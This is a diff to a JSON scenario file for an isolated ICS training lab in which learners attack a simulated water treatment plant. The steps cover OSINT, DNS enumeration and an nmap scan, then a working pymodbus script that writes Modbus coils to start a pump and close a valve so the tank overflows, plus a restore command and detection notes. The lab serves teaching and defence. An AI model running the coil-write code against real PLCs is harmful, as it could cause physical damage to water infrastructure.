@@ -6,7 +6,7 @@
     "sector": "water-treatment",
     "author": "Ian Burres — UTSA",
     "createdAt": "2026-05-19T00:00:00.000Z",
-    "updatedAt": "2026-05-19T00:00:00.000Z",
+    "updatedAt": "2026-05-20T00:00:00.000Z",
     "appVersion": "0.13.0",
     "locked": false,
     "brief": "## Mission: Water Tank Overflow\n\nMeridian Process Controls operates a water treatment facility. A network misconfiguration exposes the OT process network to the Internet DMZ. Your mission is to:\n\n1. Conduct OSINT against the company website to discover the OT subnet and credentials hidden in the HTML source.\n2. Enumerate DNS records to map the attack surface.\n3. Scan the OT network to identify the Modbus-enabled process controller.\n4. Write Modbus coil registers to start the inlet pump and close the outlet valve — triggering a tank overflow condition.\n\n**Rules of Engagement:** This is an isolated Docker lab environment. All traffic stays within your local machine.",
@@ -19,49 +19,49 @@
       {
         "id": "step-01-osint",
         "title": "Step 1 — OSINT: Discover the Target",
-        "body": "Start by visiting the Meridian Process Controls company website. In a real engagement, an attacker would begin with open-source intelligence (OSINT) before touching any systems.\n\nFrom the attack machine terminal, use `curl` to fetch the site and examine the **HTML source**. Developers often leave infrastructure comments in source code that reveal internal network addresses and credentials.\n\nNavigate to the Kali Linux desktop using the **Attack Terminal** button in the toolbar, then run the command below.",
+        "body": "Start by visiting the Meridian Process Controls company website. In a real engagement, an attacker would begin with open-source intelligence (OSINT) before touching any systems.\n\nFrom the attack machine terminal, use `curl` to fetch the site and examine the **HTML source**. Developers often leave infrastructure comments in source code that reveal internal network addresses and credentials.\n\n**How to run commands:** Click the **⚔ Kali Terminal** button in the toolbar. The terminal opens as a separate window. Click the **Copy** button above to copy the command, then press **Ctrl+V** inside the Kali terminal to paste and run it.\n\n**Note:** Paste only works in the **⚔ Kali Terminal** window. The **🖥 Kali Desktop** (noVNC) does not support clipboard paste.",
         "command": "curl -s http://{{web-company-1.ip}}/ | grep -i 'TODO\\|OT\\|subnet\\|admin\\|password\\|172\\.' | head -30",
-        "successCheck": "You should see a developer comment in the HTML containing the OT subnet (172.20.10.0/24), admin credentials (admin / Meridian2024!), and Modbus port (502). Note these down — you will need them."
+        "successCheck": "You should see a developer comment in the HTML containing the OT subnet, admin credentials (admin / Meridian2024!), and Modbus port (502). Note these down — you will need them."
       },
       {
         "id": "step-02-page-source",
         "title": "Step 2 — Dig Deeper: Remote Access Page",
-        "body": "The home page was informative, but the **Remote Access** page (`/remote.html`) is where developers typically put internal tooling links. Fetch this page and inspect its source carefully.\n\nAlso grab the HTTP banner to identify the web server version — this is useful for CVE lookups in a real engagement.",
+        "body": "The home page was informative, but the **Remote Access** page (`/remote.html`) is where developers typically put internal tooling links. Fetch this page and inspect its source carefully.\n\nAlso grab the HTTP banner to identify the web server version — this is useful for CVE lookups in a real engagement.\n\nCopy the command below and press **Ctrl+V** in the **⚔ Kali Terminal** window to run it.",
         "command": "curl -sv http://{{web-company-1.ip}}/remote.html 2>&1 | head -60",
-        "successCheck": "The Server header reveals nginx 1.27. The remote.html source contains OT network details, protocol ports, and admin credentials. HTTP banner grabbing is a fundamental recon step."
+        "successCheck": "The Server header reveals the nginx version. The remote.html source contains OT network details, protocol ports, and admin credentials. HTTP banner grabbing is a fundamental recon step."
       },
       {
         "id": "step-03-dns",
         "title": "Step 3 — DNS Enumeration",
-        "body": "The DNS server at `{{dns-1.ip}}` is authoritative for `meridian-process.com`. Enumerate its records to discover all subdomains — each may be a jump host, VPN gateway, or engineering workstation.\n\nUse `dig` or `nslookup` to query A records for common subdomains: `www`, `remote`, `vpn`, `mail`, `ot`, `scada`.",
+        "body": "The DNS server at `{{dns-1.ip}}` is authoritative for `meridian-process.com`. Enumerate its records to discover all subdomains — each may be a jump host, VPN gateway, or engineering workstation.\n\nUse `dig` to query A records for common subdomains: `www`, `remote`, `vpn`, `mail`, `ot`, `scada`.\n\nCopy and paste into **⚔ Kali Terminal** (Ctrl+V).",
         "command": "for sub in www remote vpn mail ot scada plc hmi; do echo -n \"$sub: \"; dig +short @{{dns-1.ip}} $sub.meridian-process.com; done",
-        "successCheck": "You should see A records for www (10.200.50.10) and remote (10.200.50.10). The vpn subdomain may resolve to a Plant DMZ address. Unresolved names are also informative — they confirm scope boundaries."
+        "successCheck": "You should see A records for `www` ({{web-company-1.ip}}) and `remote` ({{web-company-1.ip}}). Unresolved names are also informative — they confirm scope boundaries."
       },
       {
         "id": "step-04-nmap",
         "title": "Step 4 — Network Scan: Discover OT Devices",
-        "body": "Using the OT subnet you discovered in Step 1 (`172.20.10.0/24`), run an **Nmap** scan to identify live hosts and open ports.\n\nIn ICS environments, scanning should be **slow and careful** — aggressive scans can crash PLCs and cause physical incidents. Use the `-T2` (polite) timing template and target only TCP ports common to ICS protocols.\n\n**Key ICS ports to check:** 502 (Modbus), 20000 (DNP3), 4840 (OPC UA), 102 (S7comm / IEC 61850), 2404 (IEC 104).",
+        "body": "Using the OT subnet (`{{plc-1.subnet}}`), run an **Nmap** scan to identify live hosts and open ports.\n\nIn ICS environments, scanning should be **slow and careful** — aggressive scans can crash PLCs and cause physical incidents. Use the `-T2` (polite) timing template and target only TCP ports common to ICS protocols.\n\n**Key ICS ports to check:** 502 (Modbus), 20000 (DNP3), 4840 (OPC UA), 102 (S7comm / IEC 61850), 2404 (IEC 104).\n\nPaste into **⚔ Kali Terminal** (Ctrl+V).",
         "command": "nmap -T2 -p 502,20000,4840,102,2404 --open {{plc-1.subnet}}",
         "successCheck": "At least two hosts should respond: the PLC at {{plc-1.ip}} (port 502 open) and the process unit at {{process-unit-1.ip}} (port 502 open). These are your Modbus targets."
       },
       {
         "id": "step-05-modbus-read",
         "title": "Step 5 — Read Modbus Registers",
-        "body": "Before writing any registers, **read the current state**. This is essential in real ICS security testing — you need to know baseline values before making changes, so you can restore them afterward.\n\nUse `pymodbus` to read coil registers from the PLC at `{{plc-1.ip}}`. Coil addresses:\n- **Coil 0** — Inlet pump (0=off, 1=on)\n- **Coil 1** — Outlet valve (0=closed, 1=open)\n- **Coil 2** — Emergency shutoff (0=normal, 1=trip)\n\nAlso read holding registers 0–4 to see the current tank level and flow rates.",
+        "body": "Before writing any registers, **read the current state**. This is essential in real ICS security testing — you need to know baseline values before making changes, so you can restore them afterward.\n\nUse `pymodbus` to read coil registers from the PLC at `{{plc-1.ip}}`. Coil addresses:\n- **Coil 0** — Inlet pump (0=off, 1=on)\n- **Coil 1** — Outlet valve (0=closed, 1=open)\n- **Coil 2** — Emergency shutoff (0=normal, 1=trip)\n\nAlso read holding registers 0–4 to see the current tank level and flow rates.\n\nPaste into **⚔ Kali Terminal** (Ctrl+V).",
         "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\ncoils = c.read_coils(0, 3, slave=1)\nregs = c.read_holding_registers(0, 5, slave=1)\nprint('Coils:', coils.bits[:3])\nprint('Tank level (m):', regs.registers[0]/100.0)\nprint('Inlet flow (L/min):', regs.registers[1])\nprint('Outlet flow (L/min):', regs.registers[2])\nc.close()\n\"",
         "successCheck": "You should see Coils: [False, True, False] — pump off, valve open, no emergency trip. Tank level around 5.0 m (50% full). Inlet and outlet flows are balanced. This is the normal operating state."
       },
       {
         "id": "step-06-coil-write",
         "title": "Step 6 — Write Modbus Coils (The Attack)",
-        "body": "Now execute the attack: **start the inlet pump** (Coil 0 → 1) and **close the outlet valve** (Coil 1 → 0). With water flowing in but not out, the tank will overflow.\n\nThis is the same technique used in the **2021 Oldsmar, Florida water treatment attack** — except the attacker in that incident used remote access software rather than direct Modbus. The underlying vulnerability is identical: unauthenticated Modbus TCP.\n\n**No authentication is required.** Modbus TCP has no built-in access control — any device on the network can write any register on any PLC. This is why network segmentation and defense-in-depth are critical.",
+        "body": "Now execute the attack: **start the inlet pump** (Coil 0 → 1) and **close the outlet valve** (Coil 1 → 0). With water flowing in but not out, the tank will overflow.\n\nThis is the same technique used in the **2021 Oldsmar, Florida water treatment attack** — except the attacker in that incident used remote access software rather than direct Modbus. The underlying vulnerability is identical: unauthenticated Modbus TCP.\n\n**No authentication is required.** Modbus TCP has no built-in access control — any device on the network can write any register on any PLC. This is why network segmentation and defense-in-depth are critical.\n\nPaste into **⚔ Kali Terminal** (Ctrl+V).",
         "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\n# Start inlet pump (coil 0 = True)\nc.write_coil(0, True, slave=1)\n# Close outlet valve (coil 1 = False)\nc.write_coil(1, False, slave=1)\nprint('Attack complete: pump ON, outlet valve CLOSED')\nprint('Tank will overflow. Check holding register 0 for rising level.')\nc.close()\n\"",
         "successCheck": "Command succeeds with no exception — Modbus TCP accepted the write with no authentication challenge. Switch to the Grafana monitor (toolbar → Monitor) and watch the tank level holding register rise continuously."
       },
       {
         "id": "step-07-observe",
         "title": "Step 7 — Observe the Effect",
-        "body": "The attack is running. Now observe the physical consequence using the **Grafana monitoring dashboard**.\n\nOpen the monitor panel (toolbar → Monitor), then navigate to the **ICS Lab Overview** dashboard. Watch the **Tank Level** gauge rise past the 9.0 m overflow threshold. The **Inlet Flow** register will show positive flow; **Outlet Flow** will be zero.\n\nThis is exactly what a blue-team analyst would see in Suricata and Zeek alerts: unexpected Modbus Function Code 5 (Write Single Coil) writes from an external subnet to a PLC — a clear indicator of compromise.\n\n**To restore normal operations**, write Coil 0 = False (pump off) and Coil 1 = True (valve open) using the same pymodbus pattern.",
+        "body": "The attack is running. Now observe the physical consequence using the **Grafana monitoring dashboard**.\n\nOpen the monitor panel (toolbar → **Monitor**), then navigate to the **ICS Lab Overview** dashboard. Watch the **Tank Level** gauge rise past the 9.0 m overflow threshold. The **Inlet Flow** register will show positive flow; **Outlet Flow** will be zero.\n\nThis is exactly what a blue-team analyst would see in Suricata and Zeek alerts: unexpected Modbus Function Code 5 (Write Single Coil) writes from an external subnet to a PLC — a clear indicator of compromise.\n\n**To restore normal operations**, run the command below (paste it into **⚔ Kali Terminal** with Ctrl+V).",
         "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\nc.write_coil(0, False, slave=1)\nc.write_coil(1, True, slave=1)\nprint('Restored: pump OFF, outlet valve OPEN')\nc.close()\n\"",
         "successCheck": "Tank level should stop rising and begin dropping back toward 5.0 m. Grafana shows outlet flow resuming. You have successfully executed — and remediated — a Modbus coil write attack against a water treatment PLC."
       },
